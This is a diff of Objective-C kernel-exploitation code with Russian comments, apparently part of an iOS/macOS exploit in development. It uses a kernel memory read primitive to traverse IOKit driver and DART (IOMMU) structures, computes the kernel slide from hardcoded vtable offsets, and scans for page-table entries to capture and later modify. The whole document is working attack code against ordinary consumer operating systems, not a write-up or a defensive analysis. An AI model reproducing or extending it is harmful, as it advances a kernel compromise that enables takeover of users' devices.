@@ -6600,7 +6600,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
         kpNote(r, [NSString stringWithFormat:@"  [P2] victim wrap=%#llx UC(fObject)=%#llx provider=%#llx",
                   (unsigned long long)wVA, (unsigned long long)ucVA, (unsigned long long)provVA]);
-        uint64_t pipeVA = 0, mapVA = 0, dartVA = 0, groupVA = 0;
+        uint64_t pipeVA = 0, mapVA = 0, dartVA = 0;
         if (kpLooksLikeKernelPointer(provVA)) {
             for (uint32_t pi = 0; pi < 8 && !pipeVA; pi++) {
                 uint64_t cand = kp_untag_ptr(early_kread64(provVA + 0x140 + (uint64_t)pi * 8));
@@ -6609,22 +6609,58 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
         if (kpLooksLikeKernelPointer(pipeVA)) mapVA = kp_untag_ptr(early_kread64(pipeVA + 0x78));
         if (kpLooksLikeKernelPointer(mapVA)) dartVA = kp_untag_ptr(early_kread64(mapVA + 0x30));
-        if (kpLooksLikeKernelPointer(dartVA)) groupVA = kp_untag_ptr(early_kread64(dartVA + 0xc50));
-        kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx group=%#llx",
-                  (unsigned long long)pipeVA, (unsigned long long)mapVA,
-                  (unsigned long long)dartVA, (unsigned long long)groupVA]);
+        kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx",
+                  (unsigned long long)pipeVA, (unsigned long long)mapVA, (unsigned long long)dartVA]);
         uint64_t pteVA = 0, origPTE = 0;
-        if (kpLooksLikeKernelPointer(groupVA)) {
-            uint64_t gptrs[24];
+        uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
+        // 1.9.162 (р.37): цепочка B — verify, что mapping ПЕРСИСТИТ:
+        // provider+0xb8 = scheduler → entry-array(+0xc8) → наша запись
+        // (credit +0xc3c==0x10) → [entry+0x98]/[+0xa0] = mappingObj (vt 0x7af4ea0,
+        // +0x18=mapper). Плюс объяснение group=0: [dart+0xc50] = транзиентная
+        // транзакция, живёт только во время map — её и не должно быть.
+        if (kpLooksLikeKernelPointer(provVA)) {
+            uint64_t schVA = kp_untag_ptr(early_kread64(provVA + 0xb8));
+            uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
+            uint64_t ecnt = kpLooksLikeKernelPointer(schVA) ? early_kread64(schVA + 0xb8) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: scheduler=%#llx arr=%#llx count=%llu",
+                      (unsigned long long)schVA, (unsigned long long)earr, (unsigned long long)ecnt]);
+            if (kpLooksLikeKernelPointer(earr) && ecnt && ecnt <= 384) {
+                for (uint64_t i = 0; i < ecnt; i++) {
+                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
+                    if (!kpLooksLikeKernelPointer(ep)) continue;
+                    if ((uint32_t)(early_kread64(ep + 0xc38) >> 32) != 0x10) continue;
+                    for (uint32_t mo = 0x98; mo <= 0xa0; mo += 8) {
+                        uint64_t moVA = kp_untag_ptr(early_kread64(ep + mo));
+                        if (!kpLooksLikeKernelPointer(moVA)) continue;
+                        uint64_t movt = kp_untag_ptr(early_kread64(moVA));
+                        uint64_t moFile = movt ? movt - kslide2 : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: запись %#llx +%#x → mappingObj=%#llx vt(file)=%#llx%@",
+                                  (unsigned long long)ep, mo, (unsigned long long)moVA,
+                                  (unsigned long long)moFile,
+                                  moFile == 0x7af4ea0 ? @" ✓ mapping ЖИВ" : @""]);
+                    }
+                    break;
+                }
+            }
+        }
+        // Корни DART-таблиц — в dartObj с init (р.37): дампим ВСЕ указатели
+        // dartObj (до 0x1000), за каждым — страница PTE; ищем по PA-маске.
+        if (kpLooksLikeKernelPointer(dartVA)) {
+            uint64_t dvt = kp_untag_ptr(early_kread64(dartVA));
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dart=%#llx vt=%#llx (file %#llx; ждём 0x7dafcb0)%@",
+                      (unsigned long long)dartVA, (unsigned long long)dvt,
+                      (unsigned long long)(dvt ? dvt - kslide2 : 0),
+                      dvt - kslide2 == 0x7dafcb0 ? @" ✓" : @""]);
+            uint64_t gptrs[32];
             int gn = 0;
-            for (uint32_t o = 0; o + 8 <= 0x200 && gn < 24; o += 8) {
-                uint64_t p = kp_untag_ptr(early_kread64(groupVA + o));
+            for (uint32_t o = 0; o + 8 <= 0x1000 && gn < 32; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(dartVA + o));
                 if (!kpLooksLikeKernelPointer(p)) continue;
                 BOOL dup = NO;
                 for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
                 if (!dup) gptrs[gn++] = p;
             }
-            kpNote(r, [NSString stringWithFormat:@"  [P2] group: %d указателей — сканирую страницы на PA-маску", gn]);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей — сканирую страницы на PTE (PA-маска)", gn]);
             for (int g = 0; g < gn && !pteVA; g++) {
                 uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
                 for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
@@ -6633,9 +6669,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     if (!(q & ~0x000003FFFE000000ULL)) continue;   // голый PA без флагов — не PTE
                     pteVA = gptrs[g] + o2;
                     origPTE = q;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx: %#018llx (PA совпал, флаги %#llx)",
-                              (unsigned long long)pteVA, (unsigned long long)q,
-                              (unsigned long long)(q >> 51)]);
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (страница %#llx): %#018llx (флаги %#llx)",
+                              (unsigned long long)pteVA, (unsigned long long)gptrs[g],
+                              (unsigned long long)q, (unsigned long long)(q >> 51)]);
                     break;
                 }
             }
